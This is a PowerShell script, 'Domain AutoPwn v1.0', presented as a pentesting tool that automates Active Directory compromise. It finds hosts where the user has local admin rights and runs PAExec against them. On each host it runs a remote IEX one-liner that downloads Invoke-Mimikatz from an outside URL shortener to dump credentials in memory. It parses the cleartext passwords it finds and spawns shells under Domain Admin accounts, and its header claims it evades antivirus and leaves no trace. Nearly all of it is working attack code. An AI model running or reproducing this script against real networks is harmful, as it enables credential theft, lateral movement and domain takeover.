<#Domain AutoPwn v1.0
Ben Floyd (def.jammin@gmail.com) Available under the BSD-3 Clause


This is a bot, which uses a number of tools, including PowerSploit's Recon module, PSExec, and Mimikatz that searches for machines where the current Domain User account has 
local admin rights and grabs credentials, and automatically elevates itself to Domain Admin, if a path exists between current credentials and a DA account.
It is able to check all Domain User accounts recovered for workstations/servers where they have local admin rights, to obtain further credentials and pivot/escalate.
As Powershell is not always remotely enabled, this script can enable it remotely with PSExec (from Sysinternals), which is decoded from a base64 string and invoked reflectively 
in memory.

When connected to a remote machine as local admin, it pulls Invoke-Mimikatz from the web (or a share, if necessary) and runs it in memory on the remote machine.
All of the tools run from memory, evade anti-virus (tested against the current iteration of Symantec Endpoint Protection 12.1.6, as of time of writing), and leave no trace. 
Logs are optional.

It is intended to locate cached credentials within a domain and find Elevation of Privilege (EoP) paths. It is meant to audit highly privileged (domain admin) accounts quickly 
locate possible paths.

I wrote this software for the purposes of pentesting. There are many great components/modules/tools out there, written by talented people. 
But this is for the (extremely) busy/lazy.....after you have obtained, perhaps, helpdesk or service account credentials. Often in a penetration testing engagement, 
you are pressed for time and need to pwn the domain quickly to give your client the best value. This will do the trick, but keep in mind, this tool does not come with a 
"rules of engagement" or "scope" feature...yet.



Use of this software for malicious purposes is EXPRESSLY PROHIBITED.



In future revisions, I may add the capability to find the shortest distance between current Domain User and Domain Admin.


PowerSploit is provided under the 3-clause BSD license below: Copyright (c) 2012, Matthew Graeber All rights reserved.

Mimikatz is a program originally written by Benjamin Delpy https://github.com/gentilkiwi/mimikatz

PSExec is part of the Sysinternals software suite. Sysinternals is a wholly owned subsidiary of the Microsoft Corp. 

#>

param (
    
    [parameter(Mandatory=$false)] [bool[]] $autopwn
)

[int]$global:i=0
$invocation = (Get-Variable MyInvocation).Value
$directorypath = Split-Path $invocation.MyCommand.Path
$recon = $directorypath + '\Recon\Recon.psd1'
$blocklist = @("computer_type1","computer_type2","computer_type3")

$TableResults = New-Object System.Data.DataTable 
#$TblCredStore.Columns.Add("PwType") | Out-Null
$TableResults.Columns.Add("Domain") | Out-Null
$TableResults.Columns.Add("Username") | Out-Null
$TableResults.Columns.Add("Password") | Out-Null
$TableResults.Columns.Add("IsDomainAdmin") | Out-Null 
$TableResults.Clear()

## Import Recon.psd1 tools/commands/helpers, courtesy of PowerSploit
write-host $recon
Import-Module $recon


## Portable PSExec to enable powershell/remotely invoke commands, if necessary.
$PEBytes = [System.Convert]::FromBase64String($paexec_file)
write-host "`n[+] Downloading external content to memory...`r" -ForegroundColor Green
## Remote download of Invoke-ReflectivePEInjection (to sidestep AV)

# ----------------------------------------
# Mimikatz parse function (Will Schoeder's) 
# ----------------------------------------

# This is a *heavily customized* version of will schroeder's function Parse-Mimikatz from:
# https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
function Parse-Mimikatz {

    [CmdletBinding()]
    param(
        [string]$raw
    )
    write-host "[+] Parsing...`t`t: Done." -ForegroundColor Green
    # Create data table to house results
    $TblPasswords = New-Object System.Data.DataTable 
    $TblPasswords.Columns.Add("PwType") | Out-Null
    $TblPasswords.Columns.Add("Domain") | Out-Null
    $TblPasswords.Columns.Add("Username") | Out-Null
    $TblPasswords.Columns.Add("Password") | Out-Null
    $TblPasswords.Columns.Add("IsDomainAdmin") | Out-Null 
    $TblPasswords.Columns.Add("PasswordCaptured") | Out-Null   

    # msv
	<#$results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
        foreach($match in $results){
            if($match.Contains("Domain")){
                #write-host "Match is $match"
                $lines = $match -replace '\s+', '*'
                #write-host "Lines is $lines"
                foreach($line in $lines){
                    write-host "$line"
                    if ($line.Contains("Username")){
                        $username = $line.split('*')[5].trim()
                        write-host "$username is the username"
                    }
                    if ($line.Contains("Domain")){
                        $domain = $line.split("*")[10].trim()
                        write-host "$domain is the domain"
                    }
                    if ($line.Contains("Password")){
                        $Pwtype = "Cleartext"
                        $password = $line.split("*")[15].trim()
                        write-host "$password is the password"
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                }
            }
        }
    }#>
    <#$results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
        $Section = "tspkg - wdigest"
        foreach($match in $results){
            if($match.Contains("Domain")){
                #write-host "Match is $match"
                $lines = $match -replace '\s+', '*'
                #write-host "Lines is $lines"
                foreach($line in $lines){
                    write-host "$line"
                    if ($line.Contains("Username")){
                        $username = $($line.split('*')[5].trim()).ToLower()
                        write-host "$username is the username"
                        #$IsDomainAdmin = "No"
                        <#if ($username -ne "(null)") {
                            $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username)
                            if($WindowsPrincipal.IsInRole("Domain Admins")) {
                                write-host "DA!"
                                #$IsDomainAdmin = $WindowsPrincipal
                                }
                            }
                            Else {
                                write-host "$username IS NOT DA"
                                $IsDomainAdmin = "No"
                                }
                    }
                    #if ($line.Contains("Domain")){
                    #    $domain = $line.split("*")[10].trim()
                    #    write-host "$domain is the domain"
                    #}
                    if ($line.Contains("Password")){
                        $Pwtype = "Cleartext"
                        $password = $line.split("*")[15].trim()
                        #write-host "$password is the password"
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password,$IsDomainAdmin,$Section) | Out-Null
                }
            }
        }
    }#>
    $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
    $Section =  "wdigest - kerberos"
        foreach($match in $results){
            if($match.Contains("Domain")){
                #write-host "Match is $match"
                $lines = $match -replace '\s+', '*'
                #write-host "Lines is $lines"
                foreach($line in $lines){
                    #write-host "$line"
                    if ($line.Contains("Username")){
                        $username = $($line.split('*')[5].trim()).ToLower()
                        
                        if ($username -ne "(null)") {
                            
                            try {
                                    $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username) -ErrorAction Stop
                                    }
                            Catch
                                {
                                    $ErrorMessage = $_.Exception.Message
                                    $FailedItem = $_.Exception.ItemName
                                    Break
                                }

                            if($WindowsPrincipal.IsInRole("Domain Admins")) {
                            $IsDomainAdmin = "Yes"
                            }
                                
                            Else {
                                #write-host "$username IS NOT DA"
                                $IsDomainAdmin = "No"
                                }
                        }
                       
                    }
                    #if ($line.Contains("Domain")){
                    #    $domain = $line.split("*")[10].trim()
                    #    write-host "$domain is the domain"
                    #}
                    if ($line.Contains("Password")){
                        $Pwtype = "Cleartext"
                        $password = $line.split("*")[15].trim()
                        #write-host "$password is the password"
                        
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $PasswordCaptured = "Yes"
                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password, $isdomainadmin, $PasswordCaptured) | Out-Null
                }
            }
        }
    }
    $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
    if($results){
    #$Section =  "kerberos - ssp"
        foreach($match in $results){
            if($match.Contains("Domain")){
                #write-host "Match is $match"
                $lines = $match -replace '\s+', '*'
                #write-host "Lines is $lines"
                foreach($line in $lines){
                    #write-host "$line"
                    if ($line.Contains("Username")){
                        $username = $($line.split('*')[5].trim()).ToLower()
                        
                        if ($username -ne "(null)") {
                            try {
                                    $WindowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($username) -ErrorAction Stop
                                    }
                            Catch
                                {
                                    $ErrorMessage = $_.Exception.Message
                                    $FailedItem = $_.Exception.ItemName
                                    Break
                                }
                    }
                    #if ($line.Contains("Domain")){
                    #    $domain = $line.split("*")[10].trim()
                    #    write-host "$domain is the domain"
                    #}
                    if ($line.Contains("Password")){
                        $Pwtype = "Cleartext"
                        $password = $line.split("*")[15].trim()
                        #write-host "$password is the password"
                        
                    }
                }
                if ($password -and $($password -ne "(null)")){
                    $PasswordCaptured = "Yes"
                    $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password, $isdomainadmin, $PasswordCaptured) | Out-Null
                }
            }
        }
    }

    # Remove the computer accounts
    $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"} # | where-object { $_.IsDomainAdmin -eq ("Yes" -or "No")}
   
   }
    return $TblPasswords_Clean
}



## Gather some information about the current machine/hostname/domain
$user = [Environment]::UserName
$domain = [Environment]::Userdomainname
$file = "C:\Logs\admin_list_$user.txt"

## Define Local Admin array
$LA = $null

## Do we write a log file (locally) or is there one already?
$Global:Serverlist = New-Object System.Data.Datatable
$Global:Serverlist.Columns.Add("Item") | Out-Null
$Global:Serverlist.Columns.Add("Server") | Out-Null
function checklog {
    $return = Test-Path $file
    write-host "[+] Checking for log...." -ForegroundColor Green
    if ($return) {
        $LA = Get-Content $file 
        foreach ($Server in $LA) {
                if ((!(($Server).Contains(@blocklist)))) {            
                    $global:i++
                    $i = $global:i
                    $Global:ServerList.Rows.Add($i,$Server) | Out-Null
                    }
                }
            }
    $Global:dw = New-Object System.Data.DataView($Global:Serverlist)
    $logged = 1
    return $return
}
#$Global:Serverlist | select item, server -unique

            

             # Create data table to house found credentials
            $TblCredStore = New-Object System.Data.DataTable 
            #$TblCredStore.Columns.Add("PwType") | Out-Null
            $TblCredStore.Columns.Add("Index") | Out-null
            $TblCredStore.Columns.Add("Domain") | Out-Null
            $TblCredStore.Columns.Add("Username") | Out-Null
            $TblCredStore.Columns.Add("Password") | Out-Null
            $TblCredStore.Columns.Add("IsDomainAdmin") | Out-Null 
            

$checklog = checklog
$count = @($Global:Serverlist).count
$has_da = 0
$is_user_da = New-Object System.Security.Principal.WindowsPrincipal($user)
$current_da = $is_user_da.IsInRole("Domain Admins")

## The AutoPwn core function.  Needs a list of endpoints with Local Admin privileges to pull cached credentials.
## Iteratively Mimikatz's endpoints, parses credentials, populates TblCredStore with recovered creds.
## After recovering credentials, checks for Domain Admin privileges.  If found, spawns an elevated powershell console.
## If no DA credentials are found, it switches to the next user in the list and continues.  Eventually, I will integrate
## the Invoke-FindLocalAdmin (threaded) function with AutoPwn and make it *truly* automated, and likely much faster.  
## Can also be run from CLI with the "-autopwn" 1 switch
function autopwn {
    $Global:i = $($TblCredStore.Rows).Count
    if ($Global:serverlist -ne $null) {
        write-host "[+} Switching to AutoPwn..." -ForegroundColor Green
        $Global:Serverlist | foreach {
       if ($has_da -eq 0) {
            $global:rhost = $_.server

            # Run Invoke-Mimikatz from remote memory, log from remote powershell session to local share, "C:\Shared"...
            .\paexec \\$global:rhost -dfr -to 30 -lo .\mim_$global:rhost.log -s powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds; exit 0" > \\LPSE53536\Shared\mim_$global:rhost.log
            write-host "[+] $global:rhost" -ForegroundColor Green

            #Read log and parse credentials...
            [string]$output = Get-Content "\\$env:computername\Shared\mim_$global:rhost.log"
            $Global:TableResults = Parse-Mimikatz -raw $output
                    
            #If credentials found....            
            if ($Global:TableResults -ne $null) {                 
                    $Global:TableResults | sort-object username | select username,domain,isdomainadmin -unique  | format-table -autosize
                    $Global:TableResults | foreach {
                            $domain = $_.domain.ToLower()
                            $username = $_.username.ToLower()
                            $password = $_.password
                            $isdomainadmin = $_.isdomainadmin

                                #See if we already have these credentials stored...
                                $tbltemp = $TblCredStore | % { [string]$($_.username) }
                                if ($($tbltemp) -notcontains $username) {
                                    $global:i++

                                    #Do we have a DA account?
                                    if ($isdomainadmin -eq "Yes") {
                                        $has_da = 1
                                        write-host "!!!POSSIBLE DOMAIN ADMIN FOUND!!!" -Foregroundcolor Green
                                            
                                            #Better check to make sure.  Let's try opening a new powershell window...
                                            try {
                                                $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
                                                $credential = New-Object System.Management.Automation.PSCredential "$domain\$username", $securePassword
                                                Start-Process powershell.exe -Credential $credential -ArgumentList {-command "whoami; C:\Pentesting\Tools\PrivPwn\PrivPwn.ps1" -noexit}
                                                }

                                            #Nope, not a DA.
                                            catch {
                                                $ErrorMessage = $_.Exception.Message
                                                $FailedItem = $_.Exception.ItemName
                                                $isdomainadmin = "No"
                                                $has_da = 0
                                                write-host "$username is not a Domain Admin:`t$ErrorMessage"
                                                }

                                        }
                                        
                                        #Add credentials found to our list.
                                        $TblCredStore.Rows.Add($global:i,$domain,$username,$password,$isdomainadmin) | Out-Null   
                                    }
                                    
                            
                        }
                        
                    }               
            write-host "----------------"        
            }
         }
    }
    if ($has_da -ne 1) {
        if ($TblCredStore -ne $null) {
        Write-host "Select credentials from the list below to try next`r`n"
        $TblCredStore | select index,username,password, domain,isdomainadmin -unique | format-table -autosize
        
        
        $c = read-host "..........."
        if ($c -ne $null) {
            $pw = $($TblCredStore.Rows[$c-1].password)
            $u = $($TblCredStore.Rows[$c-1].username)
            write-host $u
            write-host $pw
            read-host "Continue?"
            $securePassword = ConvertTo-SecureString $pw -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential "$domain\$u", $securePassword
            try {
                Start-Process powershell.exe -Credential $credential -ArgumentList {-command "whoami; C:\Pentesting\Tools\PrivPwn\PrivPwn.ps1 -autopwn 1" -noexit}
                }
            catch {
                $ErrorMessage = $_.Exception.Message
                $FailedItem = $_.Exception.ItemName
                Break
            }
        }
    }
    }
        
}
if ($autopwn -eq 1){
    autopwn
    }

## Greetings & Salutations
do {
write-host "*******************************"
write-host "*******************************"
write-host "**  Welcome to AutoPwn 1.0`r`n"
write-host "**  Ben Floyd"
write-host "**  License: BSD-3 Clause"
write-host "*******************************"
write-host "*******************************`r`n"
write-host "Whoami:`t$domain\\$user@$env:computername`r" -ForegroundColor Green
write-host "IsLocalAdmin:`t",$(Invoke-CheckLocalAdminAccess -ComputerName $env:computername).IsAdmin, "`r"
write-host "IsDomainAdmin:`t","$current_da"
write-host "Log exists for current user:`t" $checklog
write-host "Servers in log: $count"
write-host "`r`n"
Write-host "Please choose from the following options:`r`n"
write-host "1337) AutoPwn v1.0b"
write-host "1) Find machines where I have local admin`t( Serverlist = $checklog )"
write-host "2) List machines where I have local admin`t( Serverlist = $checklog )"
write-host "3) Pull cached credentials on given machine`t( Serverlist = $checklog )"
write-host "4) List credentials obtained`t`t`t( Credentials = $($($TblCredStore.Rows).Count) )"
write-host "5) Switch to credentials from list"
write-host "6) Switch to new credentials (entered in)"
write-host "0) Exit`r`n"
$chosen = read-host "Selection "

### Option 1337
if ($chosen -eq 1337) {
    autopwn
}


### Option 1
if ($chosen -eq 1) {
    $newlog = "Y"
    If ($checklog)
        { 
            $newlog = read-host "Logs exists for $user.  New log?  [Y] or [N]/(Default)" 
            if (($newlog -eq "Y") -or ($newlog -eq "y")) {
                write-host "`rThis will take some time, depending on the number of endpoints in your domain...`r"
                $LA = Find-LocalAdminAccess -Threads 10
                $file = "C:\Logs\admin_list_$user.txt"
                $i = 0
                    do {
                        $i++
                        $file = "C:\Logs\admin_list_$user$i.txt"
                        if (!(checklog)) {
                            $LA | Out-File "server`r" + $file
                            $logged = 1
                        }
                    } while ($logged -eq $null)
            }
            else {
                $sel = read-host "[C]ontinue or [O]verwrite old log?`r`n"
                if (($sel -eq "O") -or ($sel -eq "o")) {
                    Remove-Item $file
                    $LA = Find-LocalAdminAccess -Threads 10
                    $file = "C:\Logs\admin_list_$user.txt"
                    $LA | Out-File $file
                }
            }

                 
    }
    else {
        write-host "`rThis will take some time, depending on the number of endpoints in your domain....`r"
                $LA = Find-LocalAdminAccess -Threads 10
                $file = "C:\Logs\admin_list_$user.txt"
                $LA | Out-File $file
                                                    
    }
    
}

### Option 2
if ($chosen -eq 2) {
write-host "`r`n"
write-host "---------------------------"
write-host "Machines with LocalAdmin`r`n`n"
        $dw | Out-GridView
write-host "---------------------------"
write-host "`r`n"
read-host "Press any key to continue..."
}



### Option 3
if ($chosen -eq 3) {

        if ($count -gt 0) {
        $Global:ServerList | select item,server -unique | format-table -autosize
        write-host "0 : Exit"
        $r = Read-Host "Select a Server to pwn"
        write-host $r
            if ($r -ne 0) {
                $global:rhost = $serverlist.Server[$r-1]
            
            .\paexec \\$global:rhost -dfr -to 30 -lo .\mim_$global:rhost.log -s powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds; exit 0" > \\LPSE53536\Shared\mim_$global:rhost.log
               
                [string]$mim = Get-Content "\\LPSE53536\Shared\mim_$global:rhost.log"
                    $Global:TableResults = Parse-Mimikatz -raw $mim
                if ($Global:TableResults -ne $null) {
                    
                    
                    $Global:TableResults | select username,domain,isdomainadmin -unique | format-table -autosize
                    
        
                    read-host "..........."
         
                    }
                else {
                   read-host "Need to find some passwords, first"
                    }
        
                    
                $Global:TableResults | foreach {
                    $domain = $_.domain.ToLower()
                    $username = $_.username.ToLower()
                    $password = $_.password
                    $isdomainadmin = $_.isdomainadmin
                    $TblCredStore.Rows.Add($domain,$username,$password,$isdomainadmin) | Out-Null

                #IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/HarmJ0y/c84065c0c487d4c74cc1/raw/70e01dfc466eaaf0e6e6ef331e9ab7d3960d1902/Invoke-Psexec.ps1')
                #Invoke-PsExec -ComputerName $rhost -Command "powershell `"IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds`""
            }
        }
    } 
}

#Option 4
if ($chosen -eq 4) {
    if ($TblCredStore -ne $null) {
        $TblCredStore | select username,domain,isdomainadmin -unique | format-table -autosize
        read-host "..........."
        }
    else {
        read-host "Need to find some passwords, first"
        }
}

#Option 5
if ($chosen -eq 5) {
    if ($TblCredStore -ne $null) {
        Write-host "Select credentials from the list below`r`n"
        $TblCredStore | select index,username, domain,isdomainadmin -unique | format-table -autosize
        
        
        $c = read-host "..........."
        if ($c -ne $null) {
            $pw = $($TblCredStore.Rows[$c-1].password)
            $u = $($TblCredStore.Rows[$c-1].username)
            write-host $u
            write-host $pw
            read-host "Continue?"
            $securePassword = ConvertTo-SecureString $pw -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential "$domain\$u", $securePassword
            try {
                Start-Process powershell.exe -Credential $credential
                }
            catch {
                $ErrorMessage = $_.Exception.Message
                $FailedItem = $_.Exception.ItemName
                Break
            }
         
        }
    else {
        read-host "Need to find some passwords, first"
        }
    }

}

#Option 6
if ($chosen -eq 6) {
    read-host "Alright smart-guy....enter your OWN credentials:"
}


### exit
} while ($chosen -ne 0)
$Global:serverlist.Clear()
$TblCredStore | out-file -append credstore.log
